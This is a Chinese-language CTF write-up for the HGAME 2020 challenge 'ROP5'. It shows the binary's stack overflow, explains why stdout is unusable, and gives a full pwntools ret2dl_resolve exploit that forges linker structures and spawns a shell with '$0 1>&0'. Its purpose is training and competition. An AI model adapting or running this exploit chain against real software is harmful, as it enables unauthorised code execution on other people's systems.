# 前言

这道题不难，算是`r2dl_resolve`的入门题。这几天开学在家自学，学到自闭，有一门课要连续上五天，每天自学100+页PPT，看两篇近两年内发布的论文，然后还要做persentation录成视频发给老师…截止时间是每天凌晨12点…PPT还要求是英文，课件也是英文…

这不，今天熬到十一点多，终于录完视频了，想着放松一下，随手翻出了Hgame的wp，看了看第四周的pwn，发现是`r2dl_resolve`的题目，还有现成的脚本，于是赶紧一键拿走。脚本作者是杭电vidar的`Veritas501`师傅，他博客里还有个x64的脚本，正好春节的时候有个x64的`r2dl_resolve`题还没做，先把脚本拿过来，明天再看hhh

## ROP5

- 题目描述：

  > Do you know the Lv.5? 
  > Just like Misaka Mikoto!

- 题目附件：[ROP5](https://cdn.jsdelivr.net/gh/TaQini/CTF@master/hgame2020/pwn/week4_1/ROP5)

- 考察点：r2dl_resolve

- 难度：困难

- 初始分值：500

- 最终分值：500

- 完成人数：14


## 程序分析

漏洞函数如下，存在缓冲区溢出：

```c
void vuln(void){
  undefined local_48 [68];
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Are you the LEVEL5?");
  close(1);
  close(2);
  read(0,local_48,0x100);
  return;
}
```

## 解题思路
读数据前关闭了stdout和stderr，无法向stdout打印数据，因此不能通过puts来泄漏libc地址

也就是说需要直接执行`system('/bin/sh >&0')`来获取shell，于是只能通过`r2dl_reslove`实现

[Veritas501](https://veritas501.space/)师傅的文章有详细`r2dl_reslove`，还写了脚本，我就一键拿走了



## exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './ROP5'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1):
    jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relent = ELF_obj.dynamic_value_by_tag("DT_RELENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    p_name = fake_stage+8-strtab
    len_bypass_version = 8-(len(func_name)+1)%0x8
    sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab

    if sym_addr_offset%0x10 != 0:
        if sym_addr_offset%0x10 == 8:
            len_bypass_version+=8
            sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab
        else:
            error('something error!')

    fake_sym = sym_addr_offset/0x10

    while True:
        fake_ndx = u16(ELF_obj.read(versym+fake_sym*2,2))
        if fake_ndx != 0:
            fake_sym+=1
            len_bypass_version+=0x10
            continue
        else:
            break

    if do_slim:
        slim = len_bypass_version - len_bypass_version%8
        version = len_bypass_version%8
        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,0)
        return (resolve_data,resolve_call,fake_stage+slim)

    fake_r_info = fake_sym<<8|0x7
    reloc_offset=fake_stage-jmprel

    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+'\x00'
    resolve_data += 'a'*len_bypass_version
    resolve_data += p32(p_name)+p32(0)+p32(0)+p32(0x12)

    resolve_call = p32(plt0)+p32(reloc_offset)

    return (resolve_data,resolve_call)

# info
# gadget
pr  = 0x08048379 # pop ebx ; ret
p3r = 0x080485d9 # pop esi ; pop edi ; pop ebp ; ret

# elf, libc
stage = elf.bss()

# rop1
dl_data,dl_call,stage = ret2dl_resolve_x86(elf,'system',stage+0x200,stage)

offset = 72
payload = 'A'*offset
payload += p32(elf.sym['read']) + p32(p3r) + p32(0) + p32(stage) + p32(len(dl_data)+8)
payload += dl_call + p32(pr) + p32(stage+len(dl_data))

ru('Are you the LEVEL5?\n')
sl(payload)
raw_input('go')
sl(dl_data+'$0 1>&0\0')

p.interactive()
```

